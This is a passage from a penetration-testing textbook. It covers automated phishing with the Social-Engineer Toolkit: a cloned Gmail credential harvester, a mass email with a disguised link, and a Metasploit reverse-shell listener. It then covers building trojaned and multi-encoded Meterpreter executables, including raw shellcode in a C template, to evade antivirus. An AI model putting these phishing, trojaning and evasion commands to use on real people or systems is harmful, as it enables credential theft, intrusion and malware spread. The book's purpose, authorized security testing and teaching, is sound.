1\nset:phishing> Your gmail email address: georgia@bulbsecurity.com\nset:phishing> The FROM NAME user will see: Georgia Weidman\nEmail password:\nset:phishing> Flag this message/s as high priority? [yes|no]: no\n[!] Unable to deliver email. Printing exceptions message below, this is most\nlikely due to an illegal attachment. If using GMAIL they inspect PDFs and is\nmost likely getting caught. u\n[*] SET has finished delivering the emails\nListing 11-9: Sending email with SET\nWhen prompted, enter the email address and password for your Gmail\naccount. SET should attempt to deliver the message. But as you can see in\nthe message at the bottom of the listing, Gmail inspects attachments and\ncatches our attack u. That’s just a first attempt, of course. You may get better results using\nyour own mail server or your client’s mail server, if you can gather or guess\nthe credentials. Of course, in this example, I’m just sending emails to myself. We\nlooked at tools such as theHarvester to find valid email addresses to target\nin Chapter 5. Setting Up a Listener\nWe can also have SET set up a Metasploit listener to catch our payload\nif anyone opens the email attachment. Even if you’re not familiar with\nMetasploit syntax, you should be able to use SET to set up this attack based\non the options we chose in “Setting Options” on page 247. You can see\nthat SET uses a resource file to automatically set the payload, LHOST, and\nLPORT options based on our previous answers when building the payload\n(see Listing 11-10). set:phishing> Setup a listener [yes|no]: yes\nEasy phishing: Set up email templates, landing pages and listeners\nin Metasploit Pro's wizard -- type 'go_pro' to launch it now. =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]\n+ -- --=[ 1246 exploits - 678 auxiliary - 198 post\n+ -- --=[ 324 payloads - 32 encoders - 8 nops\n[*] Processing src/program_junk/meta_config for ERB directives. resource (src/program_junk/meta_config)> use exploit/multi/handler\nSocial Engineering 249\nresource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/\nreverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nresource (src/program_junk/meta_config)> set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nresource (src/program_junk/meta_config)> set LPORT 443\nLPORT => 443\n--snip--\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job. msf exploit(handler) >\n[*] Started reverse handler on 192.168.20.9:443\n[*] Starting the payload handler... Listing 11-10: Setting up a listener\nNow we wait for a curious user to open our malicious PDF and send us\na session. Use ctrl-C to close the listener and type exit to move back to the\nprevious menu. Option 99 will take you back to SET’s Social-Engineering\nAttacks menu. web attacks\nIn this section we’ll look at web-based attacks. Return to the Social-\nEngineering Attacks menu (Listing 11-2), and choose option 2 (Website\nAttack Vectors). This is the sort of attack that I use most often in pentests\nthat have a social-engineering component because it emulates many social-\nengineering attacks seen in the wild. You should be presented with a list of web-based attacks as shown in\nListing 11-11. 1) Java Applet Attack Method\n2) Metasploit Browser Exploit Method\n3) Credential Harvester Attack Method\n4) Tabnabbing Attack Method\n--snip--\n99) Return to Main Menu\nset:webattack> 3\nListing 11-11: SET website attacks\nHere’s a description of some of the attacks:\n• The Java Applet Attack Method automates the Java-signed applet attack\nwe used in Chapter 10. • The Metasploit Browser Exploit Method allows you to use all of\nMetasploit’s browser-exploitation client-side attacks without having\nto set parameters manually, by knowing Metasploit syntax. 250 Chapter 11\n• The Credential Harvester Attack Method helps create websites to trick\nusers into giving up their credentials. • The Tabnabbing Attack Method relies on users’ propensity to build\nup a collection of open browser tabs. When the user first opens the\nattack page, it says “Please wait.” Naturally, the user switches back to\nanother tab while he waits. Once the attack tab is no longer in focus, it\nloads the attack site (which can be a clone of any website you like), with\nthe goal of tricking the user into supplying his credentials or otherwise\ninteracting with the malicious site. The assumption is that the user will\nuse the first tab he encounters that looks legitimate. Choose option 3, the Credential Harvester Attack Method. Next you should see a prompt asking what sort of website you would\nlike. We can choose from some prebuilt web templates, clone a website from\nthe Internet with Site Cloner, or import a custom web page with Custom\nImport. Choose option 1 to use a SET template (see Listing 11-12). 1) Web Templates\n2) Site Cloner\n3) Custom Import\n--snip--\n99) Return to Webattack Menu\nset:webattack> 1\nListing 11-12: SET website template options\nNow enter the IP address for the website to post credentials back to. We\ncan just use the local IP address for the Kali virtual machine, but if you use\nthis attack against a client, you will need an Internet-facing IP address. IP Address for the POST back in Harvester: 192.168.20.9\nNow choose a template. Because we want to trick users into enter-\ning their credentials, choose a template with a login field, such as Gmail\n(option 2), as shown in Listing 11-13. SET should now start a web server\nwith our fake Gmail page, a clone of the actual Gmail page. 1. Java Required\n2. Gmail\n3. Google\n4. Facebook\n5. Twitter\n6. Yahoo\nset:webattack> Select a template: 2\n[*] Cloning the website: https://gmail.com\n[*] This could take a little bit... Social Engineering 251\nThe best way to use this attack is if the username and password form fields\nare available. Regardless, this captures all POSTs on a website. [*] The Social-Engineer Toolkit Credential Harvester Attack\n[*] Credential Harvester is running on port 80\n[*] Information will be displayed to you as it arrives below:\nListing 11-13: Setting up the site\nNow browse to the cloned Gmail site at the Kali Linux web server and\nenter some credentials to see how this works.\n\nAfter entering credentials you\nshould be redirected to the real Gmail site. To a user it will just seem like he\ntyped in his password incorrectly. In the meantime, back in SET, you should\nsee a result that looks something like Listing 11-14.\n\n192.168.20.10 - - [10/May/2015 12:58:02] \"GET / HTTP/1.1\" 200 -\n[*] WE GOT A HIT! Printing the output:\nPARAM: ltmpl=default\n--snip--\nPARAM: GALX=oXwT1jDgpqg\nPOSSIBLE USERNAME FIELD FOUND: Email=georgiau\nPOSSIBLE PASSWORD FIELD FOUND: Passwd=passwordv\n--snip--\nPARAM: asts=\n[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\nListing 11-14: SET capturing credentials\nWhen the user submits the page, SET highlights the fields that it thinks\nare interesting. In this case, it found the Email u and Passwd v that were\nsubmitted. Once you shut down the web server with ctrl-C to end the web\nattack, the results should be written to a file.\nWhen combined with the email attack discussed next, this is a great\nattack to use to gather credentials for a pentest or, at the very least, test the\nsecurity awareness of your client’s employees.\nNote that this attack can be even more interesting if you use option 5,\nSite Cloner, to make a copy of your customer’s site. If they do not have a\npage with a login form of some sort (VPN, webmail, blogging, and so on)\nyou can even create one. Clone their site, and add a simple HTML form\nlike this:\n<form name=\"input\" action=“index.html\" method=\"post\">\nUsername: <input type=\"text\" name=\"username\"><br>\nPassword: <input type=\"password\" name=\"pwd\"><br>\n<input type=\"submit\" value=\"Submit\"><br>\n</form>\nThen use option 3, Custom Import, to have SET serve your modified page.\n252 Chapter 11\nmass email attacks\nNow to use SET to automate phishing email attacks. Create a file and enter\na few email addresses, one per line, as shown here.\nroot@kali:~# cat emails.txt\ngeorgia@bulbsecurity.com\ngeorgia@grmn00bs.com\ngeorgia@metasploit.com\nNow return to the main SET Social-Engineering Attacks menu with\noption 99 (List ing 11-2) and choose option 5, Mass Mailer Attack. Large car-\nbon copy or blind carbon copy lists can trigger spam filters or tip off users\nthat something is amiss, and emailing a long list of client employees individ-\nually by hand can be tedious, so we’ll use SET to email multiple addresses\n(see Listing 11-15). Scripts are good for repetitive tasks like this.\nset> 5\n1. E-Mail Attack Single Email Address\n2. E-Mail Attack Mass Mailer\n--snip--\n99. Return to main menu.\nset:mailer> 2\n--snip--\nset:phishing> Path to the file to import into SET: /root/emails.txtu\nListing 11-15: Setting up an email attack\nChoose option 2 and enter the name of the email address file to\nimport u.\nNext we need to choose a server (see Listing 11-16). Let’s use Gmail\nagain—option 1. When prompted, enter your credentials.\n1. Use a gmail Account for your email attack.\n2. Use your own server or open relay\nset:phishing> 1\nset:phishing> Your gmail email address: georgia@bulbsecurity.com\nset:phishing> The FROM NAME the user will see: Georgia Weidman\nEmail password:\nset:phishing> Flag this message/s as high priority? [yes|no]: no\nListing 11-16: Logging in to Gmail\nYou should be asked to create the email to send, as shown in Listing 11-17.\nset:phishing> Email subject: Company Web Portal\nset:phishing> Send the message as html or plain? 'h' or 'p': hu\n[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.\nset:phishing> Enter the body of the message, type END (capitals) when finished: All\nSocial Engineering 253\nNext line of the body:\nNext line of the body: We are adding a new company web portal. Please go to <a href=\n\"192.168.20.9\">http://www.bulbsecurity.com/webportal</a> and use your Windows domain\ncredentials to log in.\nNext line of the body:\nNext line of the body: Bulb Security Administrator\nNext line of the body: END\n[*] Sent e-mail number: 1 to address: georgia@bulbsecurity.com\n[*] Sent e-mail number: 2 to address: georgia@grmn00bs.com\n[*] Sent e-mail number: 3 to address: georgia@metasploit.com\n[*] Sent e-mail number: 4 to address:\n[*] SET has finished sending the emails\nPress <return> to continue\nListing 11-17: Sending the email\nWhen asked whether to make the email plaintext or HTML, choose h\nfor HTML u. By using HTML for the email, we’ll be better able to hide the\nreal destination of the links in the email behind graphics and such.\nNow to enter the text for the email. Because we chose HTML as the\nemail format, we can use HTML tags in our email. For example, this code\ncreates a link for the recipient to click: <a href=\"192.168.20.9\">http://www\n.bulbsecurity.com/webportal</a>. The text displayed indicates that the link\ngoes to http://www.bulbsecurity.com/webportal, but the link will really open\n\n192.168.20.9 in the browser. We control the website at 192.168.20.9, so we\ncan put a browser exploit or a phishing attack there. Add some text to the\nemail to convince users to click the included link. This is where you can be\nparticularly creative. For example, in Listing 11-17, we inform the users that\na new company portal has been added, and they should log in with their\ndomain credentials to check it out. On a pentest, a better way to approach\nthis would be to register a variation of the company’s domain name\n(bulb-security.com) or perhaps use a slight misspelling (bulbsecurty.com)\nthat is likely to go unnoticed by users and host your social-engineering\nsite there. After you finish the email, press ctrl-c to send it. The email will be\nsent to each address in the emails.txt file we entered earlier. Recipients will see this email:\nAll,\nWe are adding a new company web portal. Please go to http://\nwww.bulbsecurity.com/webportal and use your Windows domain\ncredentials to log in. Bulb Security Administrator\nWhile a security-savvy user should know better than to click links in\nemails that are not from a trusted source, and would know how to verify\nwhere a link points to before clicking it, not all users are that savvy, and\neven the savvy ones aren’t always paying attention. In fact, I have never\nlaunched a social-engineering test that failed. 254 Chapter 11\nmultipronged attacks\nLet’s combine our previous two attacks (credential harvesting and phishing\nemails) to trick employees into submitting their credentials to a pentester-\ncontrolled site. We’ll use an email attack together with a web attack to send\nusers to our attacker-controlled site by tricking them into clicking links in\nthe emails. But first we need to change an option in SET’s configuration file. In\nKali this file is at /usr/share/set/config/set_config. The option to change is\nWEB_ATTACK_EMAIL, which by default is set to OFF. Open the config file in a text\neditor and change this option to ON. ### Set to ON if you want to use Email in conjunction with webattack\nWEBATTACK_EMAIL=ON\nNow try running the Credential Harvesting attack again. Instead of\nusing a template, you can clone one of your client’s web pages if they have\na login site, such as webmail or an employee portal. If the client uses a web\npage and not a login site, use the Custom Import option to build your own page\nthat looks like the employee’s web page with a login form added. summary\nIn this chapter we’ve looked at only a couple of social-engineering attacks\nthat we can automate with SET. The scripts for your attacks will change\nbased on your clients’ needs. Some clients may have a specific attack sce-\nnario in mind, or you may find the need to run multiple attacks at once. For\ninstance, you may create a multipronged attack where you harvest creden-\ntials and the malicious website runs a malicious Java applet. In addition to\nthe web-based attacks and malicious files we looked at here, SET can cre-\nate other attacks, such as USB sticks, QR codes, and rogue wireless access\npoints. Social Engineering 255\n12\nBYPassing antiVirus\naPPliCations\nYour pentesting clients will most likely be running\nsome sort of antivirus solution. So far in this book\nwe’ve avoided having any of our malicious executables\ndeleted by antivirus applications, but antivirus program\navoidance is a constantly changing field. Typically you\nwill be more likely to avoid detection by using a memory-corruption exploit\nand loading your payload directly into memory—that is, by never touching\nthe disk. That said, with the attack landscape shifting to emphasize client-\nside and social-engineering attacks, it may not always be possible to avoid\nwriting your payload to disk. In this chapter we’ll look at a few techniques\nfor obscuring our malware to try to avoid detection when the payload is\nwritten to the disk. trojans\nIn Chapter 4, we created a standalone malicious executable that runs a\nMetasploit payload. Though we may be able to use social engineering to\ntrick a user into downloading and running our malicious file, the lack of\nany functionality other than our executable’s payload could tip off users\nthat something is amiss. We’d be much more likely to evade detection if we\ncould hide our payload inside of some legitimate program that would run\nnormally, with our payload running in the background. Such a program\nis called a trojan, after the legendary wooden horse that ended the Trojan\nWar. The horse appeared to be an innocuous offering to the gods and was\nbrought inside the previously impenetrable walled city of Troy, with enemy\nsoldiers hiding inside, ready to attack. We encountered a trojan in Chapter 8: The Vsftpd server on our Ubuntu\ntarget had a backdoor that could be triggered at login by entering a smiley\nface as part of the username. Attackers compromised the source code reposi-\ntories for Vsftpd and added additional trojan functionality to the program. Anyone who downloaded Vsftpd from the official repositories between the\ninitial compromise and detection ended up with a trojaned version. Msfvenom\nAlthough reverse-engineering binaries or gaining access to source code\nand manually adding trojan code is beyond the scope of this book, the\nMsfvenom tool has some options we can use to embed a Metasploit payload\ninside a legitimate binary. Listing 12-1 shows some important options we\nhave not encountered previously in the text. root@kali:~# msfvenom -h\nUsage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>\nOptions:\n-p, --payload [payload] Payload to use. Specify a '-' or stdin to\nuse custom payloads\n--snip--\nu-x, --template [path] Specify a custom executable file to use\nas a template\nv-k, --keep Preserve the template behavior and inject\nthe payload as a new thread\n--snip--\nListing 12-1: Msfvenom help page\nIn particular, the -x flag u allows us to use an executable file as a\ntemplate in which to embed our chosen payload. However, though the\nresulting executable will look like the original one, the added payload will\npause the execution of the original, and we shouldn’t expect a user to run\n258 Chapter 12\nan executable that appears to hang at startup very many times. Luckily,\nMsfvenom’s -k flag v will keep the executable template intact and run our\npayload in a new thread, allowing the original executable to run normally. Let’s use the -x and -k flags to build a trojaned Windows executable\nthat will appear normal to a user but which will send us a Meterpreter ses-\nsion in the background. To do so, we choose the payload with the -p flag\nand set the relevant payload options as in Chapter 4. Any legitimate execut-\nable will do; you’ll find some useful Windows binaries for pentesting in Kali\nLinux at /usr/share/windows-binaries. To embed our payload inside the radmin.exe binary enter:\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe\nOur Msfvenom command specifies the payload to generate with the\n-p option. We set the LHOST option to the IP address of Kali, the system to\ncall back to when the payload runs. We can also set the LPORT option. As\ndiscussed in this section, the -x option selects an executable in which to\nembed our payload. The -k option runs the payload in a separate thread. The -f flag tells Msfvenom to build the payload in the executable format. Once created, run the trojaned binary on either the Windows XP or\nWindows 7 target. The Radmin Viewer program should appear to run\nnormally (Figure 12-1), but the embedded payload should give us a Meter-\npreter session if we set up a handler using the multi/handler module. Figure 12-1: Trojaned Radmin Viewer executable\nBypassing Antivirus Applications 259\nCHeCking for troJans witH tHe mD5 HasH\nOur trojaned binary should convince the average user that the program is legiti-\nmate . Security-savvy users should verify the integrity of a downloaded file before\nrunning it by checking its MD5 hash against the value published by the vendor,\nwhere available . An MD5 hash is a kind of file fingerprint; if changes are made\nto the file, the MD5 hash will change . Let’s compare the MD5 hashes of the original radmin.exe with our trojaned\nversion . In Kali Linux, the md5sum program will calculate a file’s MD5 hash . Run\nmd5sum on both binaries, and you’ll find that the hash values are dramatically\ndifferent, as you can see here at u and v . root@kali:~# md5sum /usr/share/windows-binaries/radmin.exe\nu2d219cc28a406dbfa86c3301e8b93146 /usr/share/windows-binaries/radmin.exe\nroot@kali:~# md5sum radmin.exe\nv4c2711cc06b6fcd300037e3cbdb3293b radmin.exe\nHowever, the MD5 hashing algorithm is not perfect, and a tampered\nbinary could have the same MD5 hash as the original file, which is known as\nan MD5 collision attack . For this reason, many vendors publish a Secure Hash\nAlgorithm (SHA) hash as well . Of course, checking two separate hash values is better than checking one . The SHA family contains multiple hashing algorithms, and the version used will\nvary among vendors . Kali comes with programs for various SHA hashes . For\nexample, sha512sum calculates the 64-bit block size SHA-2 hash, as shown here . root@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe\n5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d\n7ef10541b22ccecd195446c55582f735374fb8df16c94343 /usr/share/windows-binaries/\nradmin.exe\nroot@kali:~# sha512sum radmin.exe\nf9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060\nd5cd15b143c146e834c491e477718bbd6fb9c2e96567e88 radmin.exe\nWhen installing software, be sure to calculate the hash(es) of your down-\nloaded version, and compare it to the value(s) published by the vendor . how antivirus applications work\nBefore we try different techniques to get our Metasploit payloads past an\nantivirus program, let’s discuss how these programs work. Most antivirus\nsolutions start by comparing potentially dangerous code to a set of patterns\nand rules that make up the antivirus definitions, which match known mali-\ncious code. Antivirus definitions are updated regularly as new malware is\nidentified by each vendor. This sort of identification is called static analysis. 260 Chapter 12\nIn addition to static analysis against a set of signatures, more advanced\nantivirus solutions also test for malicious activity, called dynamic analysis. For\nexample, a program that tries to replace every file on the hard drive or con-\nnects to a known botnet command and control server every 30 seconds is\nexhibiting potentially malicious activity and may be flagged. note Some antivirus products, such as Google’s Bouncer, run new apps that are uploaded\nto the Google Play store and pass static analysis in an isolated sandbox to try to detect\nmalicious activity that doesn’t have a known malicious signature. microsoft security essentials\nAs we use different methods in this section to bring down our detection\nrate, keep in mind that even if you not able to get a 0 percent detection\nrate among all antivirus vendors, if you know which antivirus solution\nis deployed in your client’s environment, you can focus your efforts on\nclearing just that antivirus program. In this chapter, we will try to bypass\nMicrosoft Security Essentials using various methods. When we created our Windows 7 target in Chapter 1, we installed\nMicrosoft Security Essentials, but we didn’t turn on real-time protection to\nscan files as they are downloaded or installed. Now let’s turn on this protec-\ntion to see if we can create an undetectable trojan. Open Microsoft Security\nEssentials, select the Settings tab, choose Real-time protection, and check\nthe box to turn on the service, as shown in Figure 12-2. Click Save changes.\n\nFigure 12-2: Microsoft Security Essentials real-time protection\nBypassing Antivirus Applications 261\nAs of this writing, even free antivirus solutions like Microsoft Security\nEssentials do a good job of catching Metasploit payloads. For a real test, try\ninstalling the trojaned radmin.exe with real-time protection turned on. You\nshould see a pop-up at the bottom-right corner of the screen, like the one\nshown in Figure 12-3. The file is automatically deleted before the user can\nrun it—that certainly puts a damper on things. Figure 12-3: Malicious software detected\nVirustotal\nOne way to see which antivirus solutions will flag a program as malicious is\nto upload the file in question to the VirusTotal website (https://www.virustotal\n.com/). As of this writing, VirusTotal scans uploaded files with 51 antivirus\nprograms and reports which ones detect malware. VirusTotal is shown in\nFigure 12-4. Figure 12-4: VirusTotal\nTo see which antivirus programs detect our trojaned radmin.exe as\ncurrently written, upload the file to VirusTotal and click Scan it!. Because\nantivirus definitions are constantly updated, your results will differ, but as\nyou can see in Fig ure 12-5, 25 of 51 scanners detected our file as malicious. (The bottom of the page shows which scanners detected the malware.)\n262 Chapter 12\nFigure 12-5: Trojaned binary antivirus detection\nnote VirusTotal shares uploaded binaries with antivirus vendors so they can write sig-\nnatures to match. Antivirus companies use VirusTotal signatures to improve their\ndetection engines, so anything you upload to the site may be caught by antivirus soft-\nware just because you uploaded it. To avoid that risk, you can install the antivirus\nproduct on a virtual machine and test your trojans manually against it, as we did in the\nprevious section. getting Past an antivirus Program\nClearly if we want to get past antivirus solutions, we need to try harder to\nhide. Let’s look at some other useful ways to hide our Metasploit payloads\nbesides simply placing them inside of an executable. Encoding\nEncoders are tools that allow you to avoid characters in an exploit that\nwould break it. (You’ll learn more about these requirements when we write\nour own exploits in Chapters 16 through 19.) At the time of this writing,\nMetasploit supports 32 encoders. Encoders mangle the payload and pre-\npend decoding instructions to be executed in order to decode the payload\nbefore it is run. It is a common misperception that Metasploit’s encoders\nwere designed to help bypass antivirus programs. Some Metasploit encod-\ners create polymorphic code, or mutating code, which ensures that the\nencoded payload looks different each time the payload is generated. This\nprocess makes it more difficult for antivirus vendors to create signatures\nfor the payload, but as we will see, it is not enough to bypass most antivirus\nsolutions. Bypassing Antivirus Applications 263\nTo list all of the encoders available in Msfvenom, use the -l encoders\noption, as shown in Listing 12-2. root@kali:~# msfvenom -l encoders\nFramework Encoders\n==================\nName Rank Description\n---- ---- -----------\ncmd/generic_sh good Generic Shell Variable Substitution Command Encoder\ncmd/ifs low Generic ${IFS} Substitution Command Encoder\n--snip—\nux86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder\n--snip--\nListing 12-2: Msfvenom encoders\nThe only encoder with an excellent rank is x86/shikata_ga_nai u. Shikata Ga Nai is Japanese for “It can’t be helped.” Encoder rankings are\nbased on the entropy level of the output. With shikata_ga_nai, even the\ndecoder stub is polymorphic. The nitty-gritty details of how this encoder\nworks are beyond the scope of this book, but suffice it to say that it mangles\npayloads beyond easy recognition. Tell Msfvenom to use the shikata_ga_nai encoder with the -e flag, as\nshown in Listing 12-3. Additionally, for further obfuscation, we’ll run our\npayload through an encoder multiple times, encoding the output from the\nprevious round with the -i flag and specifying the number of encoding\nrounds (10 in this case). root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)\n--snip--\n[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)\n[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\nListing 12-3: Creating an encoded executable with Msfvenom\nNow upload the resulting binary to VirusTotal. As you can see in Fig-\nure 12-6, 35 of the tested antivirus products detected our payload, even\nwith the encoding. That’s a higher detection rate than we found when\nembedding our payload inside a prebuilt executable. In other words,\nshikata_ga_nai alone doesn’t do the trick. 264 Chapter 12\nFigure 12-6: VirusTotal results for an encoded binary\nTo see if we can improve our results, we can try experimenting with\nusing multiple Metasploit encoders on our payload. For example, we\ncan combine multiple rounds of shikata_ga_nai with another Metasploit\nencoder, x86/bloxor, as shown in Listing 12-4. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -e x86/shikata_ga_nai -i 10 -f rawu > meterpreterencoded.binv\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n--snip--\n[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\nroot@kali:~# msfvenom -p -w -f exe -a x86x --platform windowsy -e x86/bloxor\n-i 2 > meterpretermultiencoded.exe < meterpreterencoded.binz\n[*] x86/bloxor succeeded with size 638 (iteration=1)\n[*] x86/bloxor succeeded with size 712 (iteration=2)\nListing 12-4: Multiencoding with Msfvenom\nThis time, we start out with Msfvenom using the windows/meterpreter/\nreverse_tcp payload as usual and encode it with shikata_ga_nai, as in the pre-\nvious example. However, instead of setting the format to .exe, we output in\nraw format u. Also, instead of outputting the results to an .exe file as we did\npreviously, this time we output the raw bytes into a .bin file v. Bypassing Antivirus Applications 265\nNow we take the results of the shikata_ga_nai encoding and encode it\nwith the x86/bloxor encoder. Our syntax for Msfvenom will differ from what\nwe are used to. First, we set the payload to null with the option -p - w. And,\nbecause we are not setting a payload, we need to tack on two new options to\ntell Msfvenom how to encode our input: -a x86 x to specify the architecture\nas 32 bit, and --platform windows y to specify the Windows platform. Finally,\nat the end of the Msfvenom command, we use the < symbol to pipe the .bin\nfile from the previous command as input into Msfvenom z. The resulting\nexecutable will be encoded with shikata_ga_nai and x86/bloxor. The resulting executable is detected by 33 antivirus programs on\nVirusTotal as of this writing—slightly better than shikata_ga_nai by itself. You may be able to improve your results by experimenting with different\nsets of encoders and chaining more than two encoders together, or by com-\nbining techniques. For example, what if we both embed our payload in a\nbinary and encode it with shikata_ga_nai as shown here? root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai\n-i 10 -f exe > radminencoded.exe\nThis gave only a slight improvement: The payload was detected by\n21 antivirus programs. And, unfortunately, Microsoft Security Essentials\nflagged both executables as malicious, as shown in Figure 12-7. We need to\nlook beyond Metasploit encoders if we’re going to get past antivirus detec-\ntion on our Windows 7 target. Figure 12-7: Microsoft is still flagging this binary as malicious. Custom Cross Compiling\nAs the de facto standard for penetration testing, Metasploit gets a fair\namount of attention from antivirus vendors who make detecting the sig-\nnatures for payloads generated by Msfvenom a priority. When Msfvenom\ncreates an executable, it uses prebuilt templates that antivirus vendors can\nuse to build detection signatures. Perhaps we can improve our ability to bypass antivirus solutions by com-\npiling an executable ourselves using raw shellcode. Let’s start with a simple\n266 Chapter 12\nC template, as shown in Listing 12-5. (We discussed the basics of C pro-\ngramming in Chapter 3. Review that section if this program doesn’t make\nsense to you.) Save this code to a file called custommeterpreter.c. #include <stdio.h>\nunsigned char random[]= u\nunsigned char shellcode[]= v\nint main(void) w\n{\n((void (*)())shellcode)();\n}\nListing 12-5: Custom executable template\nWe need to fill in data for the variables random u and shellcode v, which\nare both unsigned character arrays. Our hope is that adding some random-\nness and compiling our own C code will be enough to trick antivirus pro-\ngrams. The random variable will introduce some randomness to the template. The shellcode variable will hold the raw hexadecimal bytes of the payload we\ncreate with Msfvenom. The main function w runs when our compiled C pro-\ngram starts and executes our shellcode. Create your payload in Msfvenom as usual, except this time set the for-\nmat with the -f flag to c, as shown in Listing 12-6. This will create hex bytes\nthat we can drop into our C file. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -f c -e x86/shikata_ga_nai -i 5\nunsigned char buf[] =\n\"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n--snip--\n\"\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\xec\\xc3\";\nListing 12-6: Creating a raw payload in C format\nFinally, we need to add some randomness. A good place to find ran-\ndomness on a Linux system is in the /dev/urandom file. This file is specifically\ndesigned as a pseudorandom number generator; it generates data using\nentropy in the Linux system. But if we just cat out data from /dev/urandom, we’ll get a lot of unprint-\nable characters. To get the proper data for a character array, we’ll use the tr\nLinux utility to translate the /dev/urandom data to printable characters. Use\ntr -dc A-Z-a-z-0-9, and then pipe the commands into the head command to\noutput only the first 512 characters from /dev/urandom, as shown here.\n\nroot@kali:~# cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512\ns0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUI\nIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL\n--snip--\nBypassing Antivirus Applications 267\nNow drop the data from /dev/urandom into the random variable in the\nC file. The finished file is shown in Listing 12-7. (Of course, your random-\nness and encoded payload will differ.) Be sure to surround the string with\nquotes and use a semicolon (;) at the end. #include <stdio.h>\nunsigned char random[]= \"s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G\n0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8\n-ajdsJW7s-yZOKHQXMTY0iuawscx57e7Xds15GA6rGObF4R6oILRwCwJnEa-4vrtCMYnZiBytqtrrHkTeNohU4gXcVIem\n-lgM-BgMREf24-rcW4zTi-Zkutp7U4djgWNi7k7ULkikDIKK-AQXDp2W3Pug02hGMdP6sxfR0xZZMQFwEF-apQwMlog4Trf\n5RTHFtrQP8yismYtKby15f9oTmjauKxTQoJzJD96sA-7PMAGswqRjCQ3htuWTSCPleODITY3Xyb1oPD5wt-G1oWvavrpewe\nLERRN5ZJiPEpEPRTI62OB9mIsxex3omyj10bEha43vkerbN0CpTyernsK1csdLmHRyca\";\nunsigned char shellcode[]= \"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n\"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\"\n\"\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\"\n\"\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3\"\n\"\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\"\n\"\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\"\n\"\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\"\n\"\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\"\n\"\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\n\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\"\n\"\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\"\n\"\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\"\n\"\\x05\\x68\\x0a\\x00\\x01\\x09\\x68\\x02\\x00\\x09\\x29\\x89\\xe6\\x6a\\x10\"\n\"\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\"\n\"\\x08\\x75\\xec\\x6